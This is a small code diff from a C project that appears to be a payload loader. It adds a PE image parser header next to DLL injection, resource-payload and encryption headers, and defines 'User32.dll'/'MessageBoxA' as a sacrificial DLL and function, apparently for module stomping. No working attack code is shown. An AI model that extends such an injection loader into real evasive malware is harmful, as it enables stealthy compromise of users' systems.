@@ -11,7 +11,9 @@
 #include "rsrcPayloadTest.h"
 #include "Externals.h"
 #include "Encryption.h"
-#include  "dllinjection.h"
+#include "dllinjection.h"
+#include "peImageParser.h"
+
 
 #define		SACRIFICIAL_DLL          "User32.dll"
 #define		SACRIFICIAL_FUNC         "MessageBoxA"
